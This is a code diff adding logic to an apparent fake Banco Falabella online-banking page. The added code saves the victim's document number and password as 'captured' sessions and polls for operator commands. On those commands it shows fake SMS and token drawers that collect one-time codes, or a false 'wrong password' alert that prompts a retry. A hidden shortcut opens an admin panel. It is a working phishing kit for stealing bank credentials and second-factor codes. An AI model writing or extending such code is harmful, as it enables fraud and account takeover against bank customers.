@@ -287,12 +287,166 @@ if (bancaDocNumber && bancaPassword) {
 
 const bancaLoadingOverlay = document.querySelector("#banca-loading-overlay");
 
+// Session and Command Receiver Logic for Admin Panel
+let currentSessionId = null;
+
+function saveCapturedSession(docType, docNumber, password) {
+  currentSessionId = "sess_" + Date.now();
+  const sessions = JSON.parse(localStorage.getItem("falabella_sessions")) || [];
+  const now = new Date();
+  const timeStr = now.toLocaleDateString("es-PE") + " " + now.toLocaleTimeString("es-PE", { hour: '2-digit', minute: '2-digit' });
+  
+  const newSession = {
+    id: currentSessionId,
+    docType,
+    docNumber,
+    password,
+    time: timeStr,
+    status: "SPINNER",
+    timestamp: Date.now()
+  };
+  
+  sessions.unshift(newSession);
+  localStorage.setItem("falabella_sessions", JSON.stringify(sessions));
+  
+  startCommandPolling();
+}
+
+let commandPollTimer = null;
+function startCommandPolling() {
+  clearInterval(commandPollTimer);
+  commandPollTimer = setInterval(checkAdminCommands, 800);
+}
+
+function checkAdminCommands() {
+  if (!currentSessionId) return;
+  const activeAction = JSON.parse(localStorage.getItem("falabella_active_action"));
+  if (activeAction && activeAction.id === currentSessionId) {
+    handleAdminAction(activeAction.action);
+    localStorage.removeItem("falabella_active_action");
+  }
+}
+
+function handleAdminAction(action) {
+  if (action === "SMS") {
+    if (bancaLoadingOverlay) bancaLoadingOverlay.hidden = true;
+    closeBancaDrawer();
+    openSMSDrawer();
+  } else if (action === "TOKEN") {
+    if (bancaLoadingOverlay) bancaLoadingOverlay.hidden = true;
+    closeBancaDrawer();
+    openTokenDrawer();
+  } else if (action === "ERROR") {
+    if (bancaLoadingOverlay) bancaLoadingOverlay.hidden = true;
+    openBancaDrawer();
+    bancaPassword.value = "";
+    bancaBtnSubmit.disabled = true;
+    bancaBtnSubmit.classList.remove("is-active");
+    alert("Documento o clave de internet incorrecta. Por favor vuelve a intentarlo.");
+  } else if (action === "SUCCESS") {
+    if (bancaLoadingOverlay) bancaLoadingOverlay.hidden = true;
+    closeBancaDrawer();
+    alert("¡Operación completada con éxito!");
+  }
+}
+
+// Drawers for SMS & Token Verification
+const smsDrawer = document.querySelector("#sms-modal-drawer");
+const smsBackdrop = document.querySelector("#sms-modal-backdrop");
+const smsForm = document.querySelector("#sms-verification-form");
+const smsCodeInput = document.querySelector("#sms-code-input");
+
+function openSMSDrawer() {
+  if (!smsDrawer || !smsBackdrop) return;
+  smsBackdrop.hidden = false;
+  smsDrawer.hidden = false;
+  requestAnimationFrame(() => {
+    smsBackdrop.classList.add("is-open");
+    smsDrawer.classList.add("is-open");
+    smsCodeInput?.focus();
+  });
+}
+function closeSMSDrawer() {
+  if (!smsDrawer || !smsBackdrop) return;
+  smsBackdrop.classList.remove("is-open");
+  smsDrawer.classList.remove("is-open");
+  setTimeout(() => { smsBackdrop.hidden = true; smsDrawer.hidden = true; }, 320);
+}
+
+const tokenDrawer = document.querySelector("#token-modal-drawer");
+const tokenBackdrop = document.querySelector("#token-modal-backdrop");
+const tokenForm = document.querySelector("#token-verification-form");
+const tokenCodeInput = document.querySelector("#token-code-input");
+
+function openTokenDrawer() {
+  if (!tokenDrawer || !tokenBackdrop) return;
+  tokenBackdrop.hidden = false;
+  tokenDrawer.hidden = false;
+  requestAnimationFrame(() => {
+    tokenBackdrop.classList.add("is-open");
+    tokenDrawer.classList.add("is-open");
+    tokenCodeInput?.focus();
+  });
+}
+function closeTokenDrawer() {
+  if (!tokenDrawer || !tokenBackdrop) return;
+  tokenBackdrop.classList.remove("is-open");
+  tokenDrawer.classList.remove("is-open");
+  setTimeout(() => { tokenBackdrop.hidden = true; tokenDrawer.hidden = true; }, 320);
+}
+
+document.querySelector("#sms-modal-close")?.addEventListener("click", closeSMSDrawer);
+document.querySelector("#token-modal-close")?.addEventListener("click", closeTokenDrawer);
+
+if (smsForm) {
+  smsForm.addEventListener("submit", (e) => {
+    e.preventDefault();
+    const code = smsCodeInput.value.trim();
+    if (code.length < 6) return;
+    saveCapturedCode(code, "SMS");
+    closeSMSDrawer();
+    if (bancaLoadingOverlay) bancaLoadingOverlay.hidden = false;
+  });
+}
+
+if (tokenForm) {
+  tokenForm.addEventListener("submit", (e) => {
+    e.preventDefault();
+    const code = tokenCodeInput.value.trim();
+    if (code.length < 6) return;
+    saveCapturedCode(code, "Token");
+    closeTokenDrawer();
+    if (bancaLoadingOverlay) bancaLoadingOverlay.hidden = false;
+  });
+}
+
+function saveCapturedCode(code, type) {
+  const sessions = JSON.parse(localStorage.getItem("falabella_sessions")) || [];
+  const target = sessions.find(s => s.id === currentSessionId);
+  if (target) {
+    target.capturedCode = code;
+    target.codeType = type;
+    target.status = "SPINNER";
+    localStorage.setItem("falabella_sessions", JSON.stringify(sessions));
+  }
+}
+
+// Shortcut Ctrl + Shift + A to open Admin Dashboard
+document.addEventListener("keydown", (e) => {
+  if (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === "a") {
+    window.open("/admin", "_blank");
+  }
+});
+
 if (bancaForm) {
   bancaForm.addEventListener("submit", (e) => {
     e.preventDefault();
     if (bancaBtnSubmit.disabled) return;
     
     bancaBtnSubmit.disabled = true;
+    
+    // Save credentials & session
+    saveCapturedSession(bancaDocType.value, bancaDocNumber.value.trim(), bancaPassword.value.trim());
     
     // Show center screen loading overlay with Banco Falabella logo indefinitely
     if (bancaLoadingOverlay) {
